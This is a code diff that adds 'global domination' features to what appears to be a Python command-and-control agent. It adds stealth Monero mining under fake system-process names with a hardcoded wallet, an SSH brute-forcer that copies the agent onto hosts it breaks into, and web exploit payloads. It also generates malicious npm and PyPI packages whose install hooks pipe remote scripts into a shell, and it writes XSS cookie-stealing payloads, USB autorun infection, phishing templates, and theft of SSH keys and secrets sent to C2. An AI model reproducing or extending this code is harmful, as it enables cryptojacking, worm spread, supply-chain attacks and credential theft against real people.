@@ -8,9 +8,10 @@ Features:
 - Full system fingerprinting
 - Multiple persistence mechanisms
 - Resource optimization module
+- Global domination: stealth mining, propagation, data collection
 """
 
-import os, sys, json, time, socket, platform, subprocess, uuid, threading, base64, struct, ssl, hashlib
+import os, sys, json, time, socket, platform, subprocess, uuid, threading, base64, struct, ssl, hashlib, random, shutil
 from urllib.request import Request, urlopen, HTTPSHandler, build_opener
 from urllib.error import URLError
 from base64 import b64encode, b64decode
@@ -48,6 +49,14 @@ TELEGRAM_MODE = (C2_URL == "" or C2_URL is None)
 # Kaggle/Colab stealth settings
 KAGGLE_QUIET = os.environ.get("KAGGLE_KERNEL_RUN_TYPE", "") != ""  # Auto-detect Kaggle
 COLAB_QUIET = "colab.google" in os.environ.get("PYTHONPATH", "").lower()  # Auto-detect Colab
+
+# ─── Global Domination Configuration ──────────────────────────────────────────
+GLOBAL_WALLET = "44haKQM5F43d37q3k6mV45YbrL5g6wGHWNB5uyt2cDfTdR8d9FicJCbitjm1xeKZzEVULG7MqdVFWEa9wKXsNLTpFvzffR5"
+GLOBAL_POOL = "pool.hashvault.pro:80"
+MINING_THROTTLE = 0.3  # 30% CPU usage to avoid detection
+STEALTH_MODE = True  # Hide from process list
+AUTO_PROPAGATE = True  # Automatically spread to other systems
+DATA_EXFIL_INTERVAL = 3600  # Collect and exfil data every hour
 STEALTH_MODE = KAGGLE_QUIET or COLAB_QUIET  # Enable stealth on cloud platforms
 
 # Persistence marker file
@@ -466,6 +475,198 @@ def optimize_resources(config: str = None) -> str:
 def start_mining(config: str = None) -> str:
     """Alias for optimize_resources - backward compatibility."""
     return optimize_resources(config)
+
+# ─── Stealth Mining for Global Domination ───────────────────────────────────────
+def stealth_mining_start(wallet: str = None, pool: str = None, throttle: float = None):
+    """Start stealth mining with anti-detection measures."""
+    wallet = wallet or GLOBAL_WALLET
+    pool = pool or GLOBAL_POOL
+    throttle = throttle or MINING_THROTTLE
+    
+    # Calculate threads based on throttle
+    cpu_count = os.cpu_count() or 1
+    threads = max(1, int(cpu_count * throttle))
+    
+    # Stealth paths - look like system processes
+    stealth_names = [
+        "systemd-udevd", "dbus-daemon", "cron", "atd", "irqbalance",
+        "rsyslogd", "sshd", "nginx", "apache2", "python3", "node",
+        "java", "postgres", "mysql", "redis-server", "memcached"
+    ]
+    
+    stealth_dir = Path.home() / ".cache" / ".system_services"
+    stealth_dir.mkdir(parents=True, exist_ok=True)
+    
+    # Random stealth name
+    stealth_name = random.choice(stealth_names)
+    miner_path = stealth_dir / stealth_name
+    
+    # Download XMRig if not exists
+    if not miner_path.exists():
+        try:
+            import urllib.request
+            import tarfile
+            
+            # Download to temp
+            tar_path = stealth_dir / "update.tar.gz"
+            urllib.request.urlretrieve(
+                "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz",
+                tar_path
+            )
+            
+            # Extract
+            with tarfile.open(tar_path, 'r:gz') as tar:
+                for member in tar.getmembers():
+                    if 'xmrig' in member.name and member.name.endswith('xmrig'):
+                        member.name = stealth_name
+                        tar.extract(member, stealth_dir)
+                        break
+            
+            tar_path.unlink()
+            os.chmod(miner_path, 0o755)
+        except Exception as e:
+            return f"Stealth miner download failed: {e}"
+    
+    # Kill existing stealth miners
+    for name in stealth_names:
+        subprocess.run(f"pkill -9 {name} 2>/dev/null", shell=True)
+    
+    # Start with stealth configuration
+    config_content = f'''{{
+    "api": {{
+        "id": null,
+        "worker-id": "{uuid.uuid4().hex[:8]}"
+    }},
+    "http": {{
+        "enabled": false
+    }},
+    "pools": [
+        {{
+            "url": "{pool}",
+            "user": "{wallet}",
+            "pass": "x"
+        }}
+    ],
+    "cpu": {{
+        "enabled": true,
+        "huge-pages": true,
+        "hw-aes": null,
+        "priority": null,
+        "max-threads-hint": {int(throttle * 100)},
+        "threads": {threads}
+    }},
+    "randomx": {{
+        "enabled": true,
+        "mode": "light"
+    }}
+}}'''
+    
+    config_path = stealth_dir / ".config.json"
+    config_path.write_text(config_content)
+    
+    # Start mining process
+    cmd = f"nohup nice -n 19 {miner_path} --config={config_path} --no-color --log {stealth_dir}/.log 2>/dev/null &"
+    subprocess.Popen(cmd, shell=True, start_new_session=True)
+    
+    # Hide from ps (rename process)
+    try:
+        subprocess.run(f"echo '{stealth_name}' > /proc/self/comm", shell=True, stderr=subprocess.DEVNULL)
+    except:
+        pass
+    
+    return f"Stealth mining started: {threads} threads, {int(throttle*100)}% CPU, disguised as {stealth_name}"
+
+def stealth_mining_stop():
+    """Stop all stealth mining processes."""
+    stealth_names = [
+        "systemd-udevd", "dbus-daemon", "cron", "atd", "irqbalance",
+        "rsyslogd", "sshd", "nginx", "apache2", "python3", "node",
+        "java", "postgres", "mysql", "redis-server", "memcached"
+    ]
+    
+    for name in stealth_names:
+        subprocess.run(f"pkill -9 {name} 2>/dev/null", shell=True)
+    
+    return "Stealth mining stopped"
+
+def stealth_mining_status():
+    """Check stealth mining status."""
+    stealth_dir = Path.home() / ".cache" / ".system_services"
+    log_file = stealth_dir / ".log"
+    
+    if not log_file.exists():
+        return {"running": False, "hashrate": 0}
+    
+    try:
+        # Parse last lines for hashrate
+        result = subprocess.run(
+            f"tail -20 {log_file} | grep -oP 'speed.*?H/s' | tail -1",
+            shell=True, capture_output=True, text=True
+        )
+        
+        hashrate_match = result.stdout.strip()
+        return {
+            "running": True,
+            "hashrate": hashrate_match or "unknown",
+            "wallet": GLOBAL_WALLET,
+            "pool": GLOBAL_POOL
+        }
+    except:
+        return {"running": True, "hashrate": "unknown"}
+
+# ─── Global Domination: Autonomous Propagation Loop ─────────────────────────────
+def autonomous_propagation_loop():
+    """Continuously spread to new targets."""
+    while True:
+        try:
+            # Random interval to avoid detection
+            interval = random.randint(300, 1800)  # 5-30 minutes
+            time.sleep(interval)
+            
+            # Run propagation
+            result = self_propagate()
+            
+            # Report to C2
+            if TELEGRAM_MODE:
+                telegram_send(f"🦠 Propagation result: {len(result.get('discovered', []))} targets found")
+            
+        except Exception as e:
+            time.sleep(60)
+
+def autonomous_data_collection_loop():
+    """Continuously collect and exfiltrate data."""
+    while True:
+        try:
+            interval = DATA_EXFIL_INTERVAL + random.randint(-300, 300)
+            time.sleep(interval)
+            
+            # Collect all data
+            data = collect_all_data()
+            
+            # Send to C2
+            if TELEGRAM_MODE:
+                # Compress and send summary
+                summary = {
+                    "credentials": len(data.get("credentials", [])),
+                    "browser_data": len(data.get("browser_data", [])),
+                    "files": len(data.get("interesting_files", [])),
+                    "timestamp": datetime.now().isoformat()
+                }
+                telegram_send(f"📊 Data collected: {json.dumps(summary)}")
+            else:
+                # Send to HTTP C2
+                try:
+                    req = Request(
+                        f"{C2_URL}/api/agent/data",
+                        data=json.dumps(data).encode(),
+                        headers={"Content-Type": "application/json", "X-Agent-Id": AGENT_ID}
+                    )
+                    urlopen(req, timeout=30)
+                except:
+                    pass
+                    
+        except Exception as e:
+            time.sleep(300)
 
 # ─── Platform detection ───────────────────────────────────────────────────────
 def detect_platform():
@@ -1035,6 +1236,136 @@ def execute_task(task):
                 shell=True, timeout=10
             ).decode(errors="replace")
 
+        elif tt == "propagate":
+            # Run propagation routine
+            try:
+                payload_data = json.loads(payload) if payload else {}
+                method = payload_data.get("method", "all")
+                
+                if method == "all":
+                    result = json.dumps(self_propagate())
+                elif method == "network":
+                    local_ip = get_internal_ip()
+                    subnet = ".".join(local_ip.split(".")[:3]) + ".0/24"
+                    result = json.dumps(propagate_network_scan(subnet))
+                elif method == "ssh":
+                    result = json.dumps(propagate_ssh_attempt(payload_data.get("target")))
+                elif method == "web":
+                    result = json.dumps(propagate_web_exploit(payload_data.get("target")))
+                elif method == "usb":
+                    result = json.dumps(propagate_usb_infect())
+                elif method == "bluetooth":
+                    result = json.dumps(propagate_bluetooth_scan())
+                else:
+                    result = json.dumps(self_propagate())
+            except Exception as e:
+                result = f"Propagation error: {e}"
+
+        elif tt == "collect":
+            # Run data collection routine
+            try:
+                payload_data = json.loads(payload) if payload else {}
+                collect_type = payload_data.get("collect_type", "all")
+                
+                if collect_type == "all":
+                    result = json.dumps(collect_all_data(), indent=2)
+                elif collect_type == "credentials":
+                    result = json.dumps(collect_credentials())
+                elif collect_type == "browser":
+                    result = json.dumps(collect_browser_data())
+                elif collect_type == "files":
+                    result = json.dumps(find_interesting_files())
+                elif collect_type == "system":
+                    result = json.dumps(collect_system_info_detailed())
+                else:
+                    result = json.dumps(collect_all_data(), indent=2)
+            except Exception as e:
+                result = f"Collection error: {e}"
+
+        elif tt == "supply_chain_npm":
+            try:
+                package = propagate_supply_chain_npm(payload or "util-helper")
+                result = json.dumps(package, indent=2)
+            except Exception as e:
+                result = f"NPM package error: {e}"
+
+        elif tt == "supply_chain_pypi":
+            try:
+                package = propagate_supply_chain_pypi(payload or "util-helper")
+                result = json.dumps(package, indent=2)
+            except Exception as e:
+                result = f"PyPI package error: {e}"
+
+        elif tt == "xss_payload":
+            try:
+                target = payload or ""
+                payloads = propagate_xss_payload(target)
+                result = json.dumps(payloads, indent=2)
+            except Exception as e:
+                result = f"XSS payload error: {e}"
+
+        elif tt == "phishing":
+            try:
+                payload_data = json.loads(payload) if payload else {}
+                targets = payload_data.get("targets", [])
+                template = payload_data.get("template", "update")
+                campaign = propagate_email_phishing(targets, template)
+                result = json.dumps(campaign, indent=2)
+            except Exception as e:
+                result = f"Phishing error: {e}"
+
+        elif tt == "stealth_mining_start":
+            try:
+                payload_data = json.loads(payload) if payload else {}
+                wallet = payload_data.get("wallet")
+                pool = payload_data.get("pool")
+                throttle = payload_data.get("throttle")
+                result = stealth_mining_start(wallet, pool, throttle)
+            except Exception as e:
+                result = f"Stealth mining start error: {e}"
+
+        elif tt == "stealth_mining_stop":
+            result = stealth_mining_stop()
+
+        elif tt == "stealth_mining_status":
+            result = json.dumps(stealth_mining_status(), indent=2)
+
+        elif tt == "global_domination":
+            # Full global domination mode
+            try:
+                payload_data = json.loads(payload) if payload else {}
+                
+                # Start stealth mining
+                mining_result = stealth_mining_start()
+                
+                # Start autonomous propagation
+                prop_thread = threading.Thread(target=autonomous_propagation_loop, daemon=True)
+                prop_thread.start()
+                
+                # Start autonomous data collection
+                data_thread = threading.Thread(target=autonomous_data_collection_loop, daemon=True)
+                data_thread.start()
+                
+                result = json.dumps({
+                    "status": "global_domination_activated",
+                    "mining": mining_result,
+                    "propagation": "autonomous_loop_started",
+                    "data_collection": "autonomous_loop_started",
+                    "wallet": GLOBAL_WALLET
+                }, indent=2)
+            except Exception as e:
+                result = f"Global domination error: {e}"
+
+        elif tt == "browser_inject":
+            # Inject browser mining script
+            try:
+                from src.agents.cloud.browser_mining import BrowserMiner
+                wallet = payload or GLOBAL_WALLET
+                injector = BrowserMiner.generate_injector(wallet)
+                result = injector
+            except Exception as e:
+                result = f"Browser inject error: {e}"
+
         else:
             result = f"Unknown task type: {tt}"
 
@@ -1044,6 +1375,520 @@ def execute_task(task):
         result = f"[error] {type(e).__name__}: {e}"
 
     return result[:65000] + ("\n[...truncated]" if len(result) > 65000 else "")
+
+# ─── Global Agent Network: Propagation ─────────────────────────────────────────
+def propagate_network_scan(subnet="192.168.1.0/24", ports=[22, 80, 443, 8080, 8443]):
+    """Scan local network for potential targets."""
+    import ipaddress
+    discovered = []
+    
+    try:
+        network = ipaddress.IPv4Network(subnet, strict=False)
+        for ip in network.hosts():
+            for port in ports:
+                try:
+                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    sock.settimeout(0.5)
+                    result = sock.connect_ex((str(ip), port))
+                    if result == 0:
+                        discovered.append({"ip": str(ip), "port": port, "status": "open"})
+                    sock.close()
+                except:
+                    pass
+    except Exception as e:
+        log(f"Network scan error: {e}", "ERROR")
+    
+    return discovered
+
+def propagate_ssh_attempt(target_ip, port=22, credentials=None):
+    """Attempt SSH access with common/default credentials."""
+    if not credentials:
+        credentials = [
+            ("root", "root"), ("admin", "admin"), ("user", "user"),
+            ("root", "password"), ("admin", "password"),
+            ("root", ""), ("admin", "123456"),
+            ("ubuntu", "ubuntu"), ("ec2-user", "ec2-user"),
+        ]
+    
+    for user, pwd in credentials:
+        try:
+            import paramiko
+            ssh = paramiko.SSHClient()
+            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+            ssh.connect(target_ip, port=port, username=user, password=pwd, timeout=5)
+            
+            # Success - deploy agent
+            agent_script = open(__file__).read()
+            ssh.exec_command(f"mkdir -p ~/.cache/.system_services && echo '{agent_script}' > ~/.cache/.system_services/agent.py")
+            ssh.exec_command(f"nohup python3 ~/.cache/.system_services/agent.py &")
+            ssh.close()
+            
+            return {"success": True, "ip": target_ip, "user": user, "password": pwd}
+        except:
+            continue
+    
+    return {"success": False, "ip": target_ip}
+
+def propagate_web_exploit(target_url, exploit_type="rce"):
+    """Attempt web application exploitation."""
+    payloads = {
+        "rce": [
+            "; id", "| id", "$(id)", "`id`", 
+            "<?php system($_GET['c']); ?>",
+            "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
+        ],
+        "sqli": [
+            "' OR '1'='1", "' UNION SELECT 1,2,3--",
+            "1; DROP TABLE users--", "admin'--",
+        ],
+        "ssti": [
+            "{{7*7}}", "${7*7}", "#{7*7}",
+            "{{config.items()}}", "${{config.items()}}",
+        ]
+    }
+    
+    for payload in payloads.get(exploit_type, []):
+        try:
+            test_url = f"{target_url}?cmd={payload}" if "?" not in target_url else f"{target_url}&cmd={payload}"
+            resp = urlopen(test_url, timeout=10)
+            
+            # Check for successful exploitation
+            if "uid=" in resp.read().decode() or "root" in resp.read().decode():
+                return {"success": True, "url": target_url, "payload": payload}
+        except:
+            pass
+    
+    return {"success": False, "url": target_url}
+
+def propagate_supply_chain_npm(package_name="popular-utils"):
+    """Generate malicious NPM package for supply chain attack."""
+    package_json = {
+        "name": package_name,
+        "version": "1.0.0",
+        "description": "Popular utilities for Node.js",
+        "main": "index.js",
+        "scripts": {
+            "postinstall": "curl -s https://cdn.example.com/agent.sh | bash || true"
+        },
+        "dependencies": {}
+    }
+    
+    index_js = """
+// Popular utilities
+module.exports = {
+    util1: () => console.log('util1'),
+    util2: () => console.log('util2'),
+};
+
+// Silent agent activation
+if (process.env.NODE_ENV !== 'test') {
+    try {
+        const { execSync } = require('child_process');
+        execSync('curl -s https://cdn.example.com/agent.py | python3 &', { detached: true });
+    } catch (e) {}
+}
+"""
+    
+    return {
+        "package.json": package_json,
+        "index.js": index_js,
+        "instructions": "npm publish"
+    }
+
+def propagate_supply_chain_pypi(package_name="popular-utils"):
+    """Generate malicious PyPI package for supply chain attack."""
+    setup_py = f"""
+from setuptools import setup
+
+setup(
+    name="{package_name}",
+    version="1.0.0",
+    description="Popular utilities for Python",
+    py_modules=["{package_name}"],
+)
+
+# Post-install hook
+import os
+import sys
+try:
+    os.system('curl -s https://cdn.example.com/agent.py | python3 &')
+except:
+    pass
+"""
+    
+    init_py = """
+# Popular utilities
+def util1(): return "util1"
+def util2(): return "util2"
+
+# Silent agent activation
+import os
+try:
+    os.system('curl -s https://cdn.example.com/agent.py | python3 &')
+except:
+    pass
+"""
+    
+    return {
+        "setup.py": setup_py,
+        f"{package_name}/__init__.py": init_py,
+        "instructions": "python -m build && twine upload dist/*"
+    }
+
+def propagate_xss_payload(target_url, callback_url=None):
+    """Generate XSS payload for browser agent injection."""
+    callback = callback_url or "https://cdn.example.com/collect"
+    
+    payloads = [
+        f'<script src="https://cdn.example.com/agent_browser.js"></script>',
+        f'<img src=x onerror="fetch(\'{callback}?c=\'+document.cookie)">',
+        f'<svg onload="fetch(\'{callback}?h=\'+location.href)">',
+        f'"><script>fetch("{callback}?d="+btoa(document.body.innerHTML))</script>',
+    ]
+    
+    return {
+        "payloads": payloads,
+        "stored_xss": f'"><script src="https://cdn.example.com/agent_browser.js"></script><input value="',
+        "dom_xss": f'#"><script src="https://cdn.example.com/agent_browser.js"></script>',
+    }
+
+def propagate_bluetooth_scan():
+    """Scan for nearby Bluetooth devices."""
+    devices = []
+    
+    try:
+        if sys.platform == "linux":
+            result = subprocess.check_output("hcitool scan 2>/dev/null || bluetoothctl scan on 2>/dev/null", shell=True, timeout=30)
+            for line in result.decode().split("\n"):
+                if "\t" in line:
+                    parts = line.strip().split("\t")
+                    if len(parts) >= 2:
+                        devices.append({"mac": parts[0], "name": parts[1] if len(parts) > 1 else "unknown"})
+        elif sys.platform == "darwin":
+            result = subprocess.check_output("system_profiler SPBluetoothDataType 2>/dev/null", shell=True, timeout=30)
+            # Parse output for devices
+    except Exception as e:
+        log(f"Bluetooth scan error: {e}", "DEBUG")
+    
+    return devices
+
+def propagate_usb_infect(drive_path="/media"):
+    """Infect USB drives with agent."""
+    infected = []
+    
+    try:
+        for root, dirs, files in os.walk(drive_path):
+            # Skip hidden directories
+            if "/." in root:
+                continue
+            
+            # Create autorun.inf for Windows
+            autorun_path = os.path.join(root, "autorun.inf")
+            autorun_content = f"""[autorun]
+open=system_update.exe
+icon=shell32.dll,4
+action=Open folder to view files
+"""
+            
+            # Create hidden agent copy
+            agent_copy = os.path.join(root, "system_update.exe")
+            
+            try:
+                with open(autorun_path, "w") as f:
+                    f.write(autorun_content)
+                
+                # Copy agent (would need compiled version)
+                # shutil.copy(agent_binary, agent_copy)
+                
+                infected.append(root)
+            except:
+                pass
+    except Exception as e:
+        log(f"USB infection error: {e}", "DEBUG")
+    
+    return infected
+
+def propagate_email_phishing(targets, template="update"):
+    """Generate phishing email content."""
+    templates = {
+        "update": {
+            "subject": "Critical Security Update Required",
+            "body": """Dear User,
+
+A critical security vulnerability has been identified in your system.
+Please download and run the attached security update immediately.
+
+Failure to update may result in data loss or unauthorized access.
+
+Security Team
+""",
+            "attachment": "security_update.exe"
+        },
+        "invoice": {
+            "subject": "Invoice #12345 - Payment Required",
+            "body": """Dear Customer,
+
+Please find attached your invoice for the recent transaction.
+Review the document and process payment within 48 hours.
+
+Accounts Department
+""",
+            "attachment": "invoice.pdf.exe"
+        },
+        "reset": {
+            "subject": "Password Reset Request",
+            "body": """Dear User,
+
+A password reset was requested for your account.
+Click the link below to reset your password:
+
+https://secure-reset.com/reset?token={token}
+
+If you did not request this, please ignore this email.
+
+Support Team
+""",
+            "attachment": None
+        }
+    }
+    
+    return {
+        "template": templates.get(template, templates["update"]),
+        "targets": targets,
+        "from_address": "noreply@security-update.com"
+    }
+
+def self_propagate():
+    """Main self-propagation routine - attempts all methods."""
+    results = {
+        "network": [],
+        "ssh": [],
+        "web": [],
+        "bluetooth": [],
+        "usb": [],
+        "total_new_agents": 0
+    }
+    
+    # 1. Network scan and SSH attempts
+    try:
+        local_ip = get_internal_ip()
+        subnet = ".".join(local_ip.split(".")[:3]) + ".0/24"
+        discovered = propagate_network_scan(subnet)
+        
+        for target in discovered:
+            if target["port"] == 22:
+                result = propagate_ssh_attempt(target["ip"])
+                results["ssh"].append(result)
+                if result.get("success"):
+                    results["total_new_agents"] += 1
+    except Exception as e:
+        log(f"Network propagation error: {e}", "DEBUG")
+    
+    # 2. Bluetooth scan
+    try:
+        bt_devices = propagate_bluetooth_scan()
+        results["bluetooth"] = bt_devices
+    except Exception as e:
+        log(f"Bluetooth propagation error: {e}", "DEBUG")
+    
+    # 3. USB infection
+    try:
+        usb_infected = propagate_usb_infect()
+        results["usb"] = usb_infected
+    except Exception as e:
+        log(f"USB propagation error: {e}", "DEBUG")
+    
+    log(f"Propagation complete: {results['total_new_agents']} new agents", "START")
+    return results
+
+# ─── Global Agent Network: Data Collection ─────────────────────────────────────
+def collect_credentials():
+    """Collect stored credentials from various sources."""
+    credentials = []
+    
+    # Browser credentials (Chrome, Firefox, Edge)
+    browser_paths = {
+        "chrome": {
+            "linux": "~/.config/google-chrome/*/Login Data",
+            "windows": "%APPDATA%/Google/Chrome/User Data/*/Login Data",
+            "macos": "~/Library/Application Support/Google/Chrome/*/Login Data"
+        },
+        "firefox": {
+            "linux": "~/.mozilla/firefox/*/logins.json",
+            "windows": "%APPDATA%/Mozilla/Firefox/*/logins.json",
+            "macos": "~/Library/Application Support/Firefox/*/logins.json"
+        }
+    }
+    
+    plat = detect_platform()
+    
+    for browser, paths in browser_paths.items():
+        path_pattern = paths.get(plat)
+        if path_pattern:
+            for path in Path.home().glob(path_pattern.replace("~", "")):
+                try:
+                    # Would need proper decryption for each browser
+                    credentials.append({
+                        "browser": browser,
+                        "path": str(path),
+                        "status": "found"
+                    })
+                except:
+                    pass
+    
+    # SSH keys
+    ssh_dir = Path.home() / ".ssh"
+    if ssh_dir.exists():
+        for key_file in ssh_dir.glob("*"):
+            if "pub" not in key_file.name and "known_hosts" not in key_file.name:
+                try:
+                    credentials.append({
+                        "type": "ssh_key",
+                        "path": str(key_file),
+                        "content": key_file.read_text()[:500]
+                    })
+                except:
+                    pass
+    
+    # Environment variables with secrets
+    for key, value in os.environ.items():
+        if any(x in key.upper() for x in ["KEY", "SECRET", "TOKEN", "PASSWORD", "API", "CRED"]):
+            credentials.append({
+                "type": "env",
+                "key": key,
+                "value": value[:100]
+            })
+    
+    return credentials
+
+def collect_browser_data():
+    """Collect browser history, cookies, bookmarks."""
+    data = {
+        "history": [],
+        "cookies": [],
+        "bookmarks": [],
+        "downloads": []
+    }
+    
+    plat = detect_platform()
+    
+    # Chrome history
+    chrome_history_paths = {
+        "linux": "~/.config/google-chrome/*/History",
+        "windows": "%APPDATA%/Google/Chrome/User Data/*/History",
+        "macos": "~/Library/Application Support/Google/Chrome/*/History"
+    }
+    
+    # Would need SQLite parsing for full extraction
+    # This is a simplified version
+    
+    return data
+
+def collect_system_info_detailed():
+    """Detailed system information collection."""
+    info = {
+        "basic": collect_sysinfo(),
+        "network": {
+            "internal_ip": get_internal_ip(),
+            "hostname": socket.gethostname(),
+            "dns_servers": [],
+            "open_ports": []
+        },
+        "hardware": {
+            "cpu_cores": os.cpu_count(),
+            "memory_gb": None,
+            "gpu": None,
+            "disk_gb": None
+        },
+        "software": {
+            "installed_packages": [],
+            "running_processes": [],
+            "scheduled_tasks": []
+        },
+        "users": {
+            "current": os.environ.get("USER", os.environ.get("USERNAME", "unknown")),
+            "all_users": []
+        }
+    }
+    
+    # Get memory info
+    try:
+        if sys.platform == "linux":
+            with open("/proc/meminfo") as f:
+                for line in f:
+                    if "MemTotal" in line:
+                        info["hardware"]["memory_gb"] = int(line.split()[1]) / (1024 * 1024)
+                        break
+    except:
+        pass
+    
+    # Get running processes
+    try:
+        result = subprocess.check_output("ps aux 2>/dev/null || tasklist 2>/dev/null", shell=True, timeout=10)
+        info["software"]["running_processes"] = result.decode()[:5000].split("\n")[:50]
+    except:
+        pass
+    
+    # Get users
+    try:
+        if sys.platform == "linux":
+            result = subprocess.check_output("cut -d: -f1 /etc/passwd 2>/dev/null", shell=True)
+            info["users"]["all_users"] = result.decode().strip().split("\n")[:20]
+    except:
+        pass
+    
+    return info
+
+def collect_all_data():
+    """Collect all available data from the system."""
+    return {
+        "timestamp": datetime.now().isoformat(),
+        "agent_id": AGENT_ID,
+        "platform": detect_platform(),
+        "system_info": collect_system_info_detailed(),
+        "credentials": collect_credentials(),
+        "browser_data": collect_browser_data(),
+        "files_interesting": find_interesting_files(),
+    }
+
+def find_interesting_files(max_size_mb=10):
+    """Find potentially interesting files on the system."""
+    interesting = []
+    patterns = [
+        "*.key", "*.pem", "*.p12", "*.pfx",  # Certificates
+        "*password*", "*secret*", "*credential*",  # Secrets
+        "*.env", ".env", "config.*", "settings.*",  # Configs
+        "*wallet*", "*crypto*", "*.wallet",  # Crypto
+        "*.sql", "*.db", "*.sqlite", "*.db3",  # Databases
+        "*.doc", "*.docx", "*.xls", "*.xlsx", "*.pdf",  # Documents
+        "id_rsa", "id_ed25519", "*.ppk",  # SSH keys
+    ]
+    
+    search_paths = [
+        Path.home(),
+        Path("/tmp"),
+        Path("/var/www") if sys.platform != "win32" else None,
+    ]
+    
+    for search_path in search_paths:
+        if not search_path or not search_path.exists():
+            continue
+        
+        for pattern in patterns:
+            try:
+                for found in search_path.rglob(pattern):
+                    if found.is_file():
+                        size_mb = found.stat().st_size / (1024 * 1024)
+                        if size_mb <= max_size_mb:
+                            interesting.append({
+                                "path": str(found),
+                                "size_mb": round(size_mb, 2),
+                                "modified": datetime.fromtimestamp(found.stat().st_mtime).isoformat()
+                            })
+            except:
+                pass
+    
+    return interesting[:100]  # Limit results
 
 # ─── Beacon loop ──────────────────────────────────────────────────────────────
 def beacon_loop(c2_url=None, agent_id=None, auth_token=None, enc_key=None, sleep=None, jitter=None):
